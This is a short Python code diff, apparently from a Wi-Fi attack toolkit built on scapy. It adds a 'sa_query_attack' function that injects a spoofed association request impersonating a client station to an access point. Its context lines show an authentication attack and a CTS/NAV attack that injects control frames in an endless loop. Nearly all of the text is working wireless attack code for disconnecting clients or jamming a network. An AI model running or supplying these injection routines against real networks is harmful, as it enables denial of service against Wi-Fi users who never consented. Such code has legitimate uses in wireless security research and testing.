@@ -1,6 +1,6 @@
 import subprocess
 
-from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap
+from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap, Dot11AssoReq
 
 
 def auth_attack(interface, sta, ap):
@@ -26,3 +26,9 @@ def cts_nav_attack(interface, target_mac):
           Dot11(ID=0x7d00, type='Control', subtype=12, addr1=target_mac)
     while True:
         interface.inject(pkt)
+
+
+def sa_query_attack(interface, ap, sta):
+    pkt = Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
+        Dot11AssoReq(cap=0x1100, listen_interval=0x000a)
+    interface.inject(pkt)
